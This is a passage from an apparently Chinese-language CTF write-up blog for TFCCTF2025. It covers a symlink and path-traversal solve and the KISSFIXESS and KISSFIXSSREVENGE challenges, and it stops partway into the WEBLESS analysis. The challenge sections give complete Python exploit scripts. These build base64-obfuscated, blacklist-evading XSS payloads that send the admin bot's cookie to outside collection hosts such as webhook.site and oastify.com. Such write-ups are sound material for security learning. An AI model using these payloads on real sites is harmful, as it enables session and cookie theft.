function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>可以通过前面的软链接读取 <code>server.js</code> ，进而获取保存的 <code>sessiondata</code></p>
<p>然后使用 <code>sha256</code> 计算得到 <code>develop</code> 的 <code>userId</code> </p>
<p>然后通过访问 <code>/debug/files</code> 获取存放 flag.txt 的目录名，然后再通过软件读取</p>
<p>获取FLAG的思路如下：</p>
<ol>
<li><p>软链接读取 <code>/app/.env</code> 和 <code>/app/server.js</code>，获取 <code>SESSION_SECRET</code> 和 <code>develop</code>的<code>sessionData</code></p>
</li>
<li><p><code>hmac</code> 计算 <code>develop</code> 的 <code>userId</code>，修改<code>host</code>为<code>127.0.0.1</code>，修改<code>cookie</code>为计算出的<code>userId</code>，访问 <code>debug/files</code> 利用路径穿越漏洞获取存放 <code>flag.txt</code> 的目录</p>
</li>
</ol>
<p><img src="/image-20250901105312884.png" alt="image-20250901105312884"></p>
<p>存放flag.txt的目录：</p>
<style>.rkzqpezyxxsm{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901105053972.png" class="rkzqpezyxxsm" alt="image-20250901105053972">

<ol start="3">
<li>利用软链接读取 &#x2F;tlhedn6f&#x2F;flag.txt 文件，获取FLAG</li>
<li><style>.wszzjjveyies{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901105617324.png" class="wszzjjveyies" alt="image-20250901105617324"></li>
</ol>
<h3 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h3><p><strong>一、题目描述</strong></p>
<p>模板渲染，用户输入 Name ，服务端渲染成不同颜色</p>
<style>.hvgeytvrtwtl{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901211720915.png" class="hvgeytvrtwtl" alt="image-20250901211720915">

<p>分析源码发现，模拟管理员访问<code>URL</code>的机器人 bot.py，显示 <code>flag</code> 被当作<code>cookie</code>存放</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver.add_cookie(&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;TFCCTF&#123;~&#125;&quot;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>通过源码分析，该服务端使用 <code>http.server</code> + <code>Mako</code> 模板渲染，用户输入通过 GET 请求 <code>name_input</code> 参数提交，页面上有一个  “Report Name” 按钮，点击后会发 POST 请求 <code>/report</code>。<code>/report</code> 处理函数会调用 机器人 <code>bot.py</code> 的 <code>visit_url</code> 函数访问指定 URL。</p>
<p>用户输入<code>Name</code>被保存在变量 <code>name_to_display</code> ，在渲染之前有2处过滤：</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止危险字符</span></span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># 过滤危险字符，不能使用 self,(),.,import等</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">in</span> name:</span><br><span class="line">            name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># render_page函数调用escape_html，后者在渲染页面时禁止 “&amp;&lt;&gt;()”</span></span><br><span class="line">    <span class="variable language_">self</span>.wfile.write(render_page(name_to_display=name).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>**绕过：**L和S，JS语言的Function构造器（<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;hi&#x27;)&quot;</span>)()</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>escape_html</code> 函数： 对用户输入的字符串进行转义（escape），以防止浏览器把它当成 <code>HTML</code> 或 <code>JavaScript</code> 解析，防止<code>XSS</code>攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;)   # 把 &amp; 转义为 &amp;amp;</span></span><br><span class="line"><span class="string">       .replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)    # 把 &lt; 转义为 &amp;lt;  (防止开始标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;)    # 把 &gt; 转义为 &amp;gt;  (防止结束标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;(&quot;, &quot;&amp;#40;&quot;)   # 把 ( 转义为 &amp;#40; (避免JS函数调用)</span></span><br><span class="line"><span class="string">       .replace(&quot;)&quot;, &quot;&amp;#41;&quot;))  # 把 ) 转义为 &amp;#41;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后被过滤或转义的 <code>name_to_display</code> 被当作参数，传入<code>template.render</code>函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>**绕过：**构造映射关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过精心构造，用户输入<code>name_to_display</code>可以走到页面渲染<code>template.render</code>函数，存在SSTI</p>
<p>**解题思路：**利用SSTI漏洞将恶意链接（作用是获取网页Cookie并发送到指定域名）渲染到服务端返回的HTML中，然后通过POST请求 <code>/report</code>调用机器人访问该恶意链接，将机器人的Cookie（即flag）发送到指定域名</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;</span>)+document.cookie</span><br></pre></td></tr></table></figure>

<p>当浏览器执行这段代码时，就会把用户 Cookie 传送到 <code>https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84</code></p>
<p>通过加入<code>空格</code>绕过base64编码后存在 <code>l</code> 和 <code>s</code> 的问题，使用上述绕过方法，最终的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]&#125;SCRIPT$&#123;banned[2]&#125;Function$&#123;banned[3]&#125;atob$&#123;banned[3]&#125;`ICBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvMGI5OWZjZDMtNmY1My00OTA2LTg4OWEtM2U3ZmQ4YjE5YTg0Lz92Yz0nK2RvY3VtZW50LmNvb2tpZSkg`$&#123;banned[4]&#125;$&#123;banned[4]&#125;$&#123;banned[3]&#125;$&#123;banned[4]&#125;$&#123;banned[1]&#125;/SCRIPT$&#123;banned[2]&#125;</span><br></pre></td></tr></table></figure>

<p>将payload作为Name输入，服务器端返回的页面包含：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://attacker.com?x=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>机器人bot.py访问该页面时：HTML 被解析，<code>&lt;iframe&gt;</code> 加载时触发 <code>onload</code>，<code>fetch()</code> 调用执行，浏览器（或机器人）发送 cookie 到指定域名，获取cookie</p>
<p><img src="/76564239253c115e5fd5196ea43a8f5.png" alt="76564239253c115e5fd5196ea43a8f5"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">js_inner = <span class="string">&#x27;fetch(&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;)+document.cookie&#x27;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe onLoad=&#x27;JAVASCRIPT:<span class="subst">&#123;js&#125;</span>&#x27; &gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">    to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="KISSFIXSSREVENGE"><a href="#KISSFIXSSREVENGE" class="headerlink" title="KISSFIXSSREVENGE"></a>KISSFIXSSREVENGE</h3><p>过滤条件更严格</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESS</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESSREVENGE</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;&amp;&quot;, &quot;%&quot;, &quot;^&quot;, &quot;#&quot;, &quot;@&quot;, &quot;!&quot;, &quot;*&quot;, &quot;-&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;, &quot;JAVASCRIPT&quot;, &quot;window&quot;, &quot;atob&quot;, &quot;btoa&quot;, &quot;=&quot;]</span><br></pre></td></tr></table></figure>

<p>绕过方法：</p>
<ol>
<li>大小写：<code>L</code>和<code>S</code></li>
<li><code>JS</code>语言的<code>Function</code>构造器：<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行</li>
<li><code>mapping</code>映射：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sum to remove `l` char in base64</span></span><br><span class="line">js_inner = <span class="string">&quot;  fetch(&#x27;https://m5s9ag1y50zj7a69toy64m&#x27; + &#x27;7l7cd31zxnm.oastify.com/?x=&#x27;+document.cookie) &quot;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;<span class="subst">&#123;js&#125;</span>&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">        to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># (Blocked chars check)</span></span><br><span class="line"><span class="comment"># Not exploit</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;import&quot;</span>,</span><br><span class="line">          <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;JAVASCRIPT&quot;</span>, <span class="string">&quot;window&quot;</span>, <span class="string">&quot;atob&quot;</span>, <span class="string">&quot;btoa&quot;</span>, <span class="string">&quot;=&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEBLESS"><a href="#WEBLESS" class="headerlink" title="WEBLESS"></a>WEBLESS</h3><p><strong>一、题目描述</strong></p>
<p>用户注册登录后，可以创建 Post ，创建好之后可以浏览，也可以通过点击 Report to Admin 触发机器人访问该Post</p>
<style>.hohhypbxdhki{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250902204726339.png" class="hohhypbxdhki" alt="image-20250902204726339">

<p>flag被管理员写在了Post中，只有管理员或者机器人可通过 <code>/post/0</code> 访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ADMIN_USERNAME = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">ADMIN_PASSWORD = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;ADMIN_USERNAME: ADMIN_PASSWORD&#125;</span><br><span class="line">posts = [&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: ADMIN_USERNAME,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: FLAG,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>

<p>目标是让机器人访问存放flag的页面： <code>post/0</code> ，然后再想办法获取flag</p>
<p><strong>二、题目分析</strong></p>
<p>用户登录之后，可以创建Post</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create_post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_post</span>():</span><br><span class="line">    title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    description = request.form[<span class="string">&quot;description&quot;</span>]   <span class="comment"># 获取用户输入的 description</span></span><br><span class="line">    hidden = request.form.get(<span class="string">&quot;hidden&quot;</span>) == <span class="string">&quot;on&quot;</span>  <span class="comment"># Checkbox in form for hidden posts</span></span><br><span class="line">    post_id = <span class="built_in">len</span>(posts)</span><br><span class="line">    posts.append(&#123;   // 将用户的该post条目加入posts</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: post_id,</span><br><span class="line">        <span class="string">&quot;author&quot;</span>: session[<span class="string">&quot;username&quot;</span>],   <span class="comment"># author是session[username]</span></span><br><span class="line">        <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: description,</span><br><span class="line">        <span class="string">&quot;hidden&quot;</span>: hidden</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>用户可以访问自己创建的笔记</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_page</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="comment"># 判断访问的id是否存在</span></span><br><span class="line">    post = <span class="built_in">next</span>((p <span class="keyword">for</span> p <span class="keyword">in</span> posts <span class="keyword">if</span> p[<span class="string">&quot;id&quot;</span>] == post_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Post not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="comment"># 判断用户是否设置可见 且 判断用户是否为作者</span></span><br><span class="line">    <span class="keyword">if</span> post.get(<span class="string">&quot;hidden&quot;</span>) <span class="keyword">and</span> post[<span 